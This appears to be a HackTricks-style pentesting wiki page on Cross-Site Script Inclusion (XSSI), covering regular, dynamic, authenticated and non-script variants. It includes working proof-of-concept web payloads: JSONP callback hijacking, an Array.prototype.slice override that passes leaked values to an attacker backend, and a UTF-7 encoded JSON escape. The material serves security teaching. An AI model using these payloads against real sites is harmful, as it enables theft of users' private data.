  **Cross-Site Script Inclusion (XSSI)** is a vulnerability that arises from the nature of the `script` tag in HTML. Unlike\
  \ most resources, which are subject to the **Same-Origin Policy (SOP)**, scripts can be included from different domains.\
  \ This behavior is intended to facilitate the use of libraries and other resources hosted on different servers but also\
  \ introduces a potential security risk.\n\n### Key Characteristics of **XSSI**:\n\n- **Bypass of SOP**: Scripts are exempt\
  \ from the **Same-Origin Policy**, allowing them to be included across domains.\n- **Data Exposure**: An attacker can exploit\
  \ this behavior to read data loaded via the `script` tag.\n- **Impact on Dynamic JavaScript/JSONP**: **XSSI** is particularly\
  \ relevant for dynamic JavaScript or **JSON with Padding (JSONP)**. These technologies often use \"ambient-authority\" information\
  \ (like cookies) for authentication. When a script request is made to a different host, these credentials (e.g., cookies)\
  \ are automatically included in the request.\n- **Authentication Token Leakage**: If an attacker can trick a user's browser\
  \ into requesting a script from a server they control, they might be able to access sensitive information contained in these\
  \ requests.\n\n### Types\n\n1. **Static JavaScript** - This represents the conventional form of XSSI.\n2. **Static JavaScript\
  \ with Authentication** - This type is distinct because it requires authentication to access.\n3. **Dynamic JavaScript**\
  \ - Involves JavaScript that dynamically generates content.\n4. **Non-JavaScript** - Refers to vulnerabilities that do not\
  \ involve JavaScript directly.\n\n**The following information is a sumary of [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**.\
  \ Check it for further details.\n\n### Regular XSSI\n\nIn this approach, private information is embedded within a globally\
  \ accessible JavaScript file. Attackers can identify these files using methods like file reading, keyword searches, or regular\
  \ expressions. Once located, the script containing private information can be included in malicious content, allowing unauthorized\
  \ access to sensitive data. An example exploitation technique is shown below:\n\n```html\n<script src=\"https://www.vulnerable-domain.tld/script.js\"\
  ></script>\n<script>\n  alert(JSON.stringify(confidential_keys[0]))\n</script>\n```\n\n### Dynamic-JavaScript-based-XSSI\
  \ and Authenticated-JavaScript-XSSI\n\nThese types of XSSI attacks involve confidential information being dynamically added\
  \ to the script in response to a user's request. Detection can be performed by sending requests with and without cookies\
  \ and comparing the responses. If the information differs, it may indicate the presence of confidential information. This\
  \ process can be automated using tools like the [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp extension.\n\
  \nIf confidential data is stored in a global variable, it can be exploited using similar methods to those used in Regular\
  \ XSSI. However, if the confidential data is included in a JSONP response, attackers can hijack the callback function to\
  \ retrieve the information. This can be done by either manipulating global objects or setting up a function to be executed\
  \ by the JSONP response, as demonstrated below:\n\n```html\n<script>\n  var angular = function () {\n    return 1\n  }\n\
  \  angular.callbacks = function () {\n    return 1\n  }\n  angular.callbacks._7 = function (leaked) {\n    alert(JSON.stringify(leaked))\n\
  \  }\n</script>\n<script\n  src=\"https://site.tld/p?jsonp=angular.callbacks._7\"\n  type=\"text/javascript\"></script>\n\
  ```\n\n```html\n<script>\n  leak = function (leaked) {\n    alert(JSON.stringify(leaked))\n  }\n</script>\n<script src=\"\
  https://site.tld/p?jsonp=leak\" type=\"text/javascript\"></script>\n```\n\nFor variables not residing in the global namespace,\
  \ _prototype tampering_ can sometimes be exploited. This technique leverages JavaScript's design, where code interpretation\
  \ involves traversing the prototype chain to locate the called property. By overriding certain functions, such as `Array`'s\
  \ `slice`, attackers can access and leak non-global variables:\n\n```javascript\nArray.prototype.slice = function () {\n\
  \  // leaks [\"secret1\", \"secret2\", \"secret3\"]\n  sendToAttackerBackend(this)\n}\n```\n\nFurther details on attack\
  \ vectors can be found in the work of Security Researcher [Sebastian Lekies](https://twitter.com/slekies), who maintains\
  \ a list of [vectors](http://sebastian-lekies.de/leak/).\n\n### Non-Script-XSSI\n\nTakeshi Terada's research introduces\
  \ another form of XSSI, where Non-Script files, such as CSV, are leaked cross-origin by being included as sources in a `script`\
  \ tag. Historical instances of XSSI, such as Jeremiah Grossman’s 2006 attack to read a complete Google address book and\
  \ Joe Walker’s 2007 JSON data leak, highlight the severity of these threats. Additionally, Gareth Heyes describes an attack\
  \ variant involving UTF-7 encoded JSON to escape the JSON format and execute scripts, effective in certain browsers:\n\n\
  ```javascript\n;[\n  {\n    friend: \"luke\",\n    email:\n      \"+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-\"\
  ,\n  },\n]\n```\n\n```html\n<script\n  src=\"http://site.tld/json-utf7.json\"\n  type=\"text/javascript\"\n  charset=\"\
  UTF-7\"></script>\n```\n\n{{#include ../banners/hacktricks-training.md}}"
